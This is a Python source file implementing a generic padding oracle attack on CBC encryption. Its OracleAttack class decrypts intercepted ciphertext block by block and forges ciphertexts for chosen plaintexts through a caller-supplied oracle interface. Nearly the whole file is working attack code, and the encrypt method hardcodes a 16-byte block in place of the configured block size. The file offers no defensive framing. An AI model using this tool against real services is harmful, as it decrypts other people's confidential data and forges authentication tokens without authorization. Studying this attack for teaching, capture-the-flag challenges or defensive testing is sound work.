#!/usr/bin/env python3

import os

def remove_padding(plaintext):
    """ This function removes A VALID(!) PKCS#7 padding.

    Args:
        plaintext (bytes): PKCS#7 padded data
    """
    return plaintext[:-plaintext[-1]]

class OracleAttack:
    """ This class provides functions to encrypt and decrypt messages using
    the padding oracle.
    """

    def __init__(self, blocksize, interface, verbose=False):
        self.blocksize = blocksize
        self.interface = interface
        self.verbose = verbose

    def _crack_position(self, blocks, position, pad):
        for byte in ([i for i in range(256) if i != pad] + [pad]):
            b = blocks.copy()
            self._patch_byte(b, position, byte ^ pad)

            if self.interface.oracle(b''.join(b)):
                return byte

        raise Exception("cant decrypt byte at position {0}".format(position))

    def _chunking(self, p):
        """ This function splits a bunch of data into blocks of fixed
        blocksize length and returns a list of the chunks.

        Args:
            p (bytes): the payload
        """

        return [p[i:(i+self.blocksize)] for i in range(0, len(p), self.blocksize)]

    def _patch_byte(self, blocks, position, patch):
        """ The patch gets xor'd to blocks[-2] where the actual value gets
        added too. For example: if you want to crack the last byte of the last
        block you want to manipulate the last byte of blocks[-2] and you have
        to call that function like: self._patch_byte(blocks, 16, value ^ 0x01)
        """

        b, p = blocks, position - 1
        b[-2] = b[-2][:p] + bytes([b[-2][p] ^ patch]) + b[-2][(p + 1):]
        return b

    def _reveal_last_block(self, message):
        """ This function uses the padding oracle to crack the last block of the
        message. It returns the plaintext of the last block.

        Args:
            message (bytes): the message of which the last block should be cracked
        """

        plainblock = b''
        original_blocks = self._chunking(message)

        for counter in range(1, self.blocksize + 1):
            blocks = original_blocks.copy()

            # adjusting blocks for new cycle:
            for i, value in enumerate(reversed(plainblock)):
                self._patch_byte(blocks, self.blocksize - i, counter ^ value)

            result = self._crack_position(blocks, self.blocksize - counter + 1, counter)
            plainblock = bytes([result]) + plainblock

        return plainblock

    def decrypt(self, ciphertext, remove_pad=False):
        """ This function decrypts an intercepted message by using the padding
        oracle defined in the given interface (except the first block, which
        can't be decrypted without controle over crypto IV.

        Args:
            message (bytes): the intercepted message
        """

        plaintext = b''

        if len(ciphertext) % self.blocksize != 0:
            raise Exception("message has to be a valid length")

        while len(ciphertext) > self.blocksize:
            plaintext = self._reveal_last_block(ciphertext) + plaintext

            if self.verbose:
                print("[+] revealed block:", plaintext)

            # cut last block. we have already decrypted it :)
            ciphertext = ciphertext[:-self.blocksize]

        if remove_pad:
            plaintext = remove_padding(plaintext)

        return plaintext

    def encrypt(self, plaintext, last_block=None):
        """ This function returns the proper ciphertext for the given plaintext using
        a padding oracle.
        """

        if len(plaintext) % self.blocksize != 0:
            raise Exception("message has to be a valid length")

        ciphertext = last_block if last_block else os.urandom(self.blocksize)
        assert len(ciphertext) == self.blocksize

        while len(plaintext) > 0:
            plaintext, last_block = plaintext[:-self.blocksize], plaintext[-self.blocksize:]

            tux = self._reveal_last_block(bytes([0]) * 16 + ciphertext[:16])
            ciphertext = bytes(a^b for a, b in zip(tux, last_block)) + ciphertext

        return ciphertext
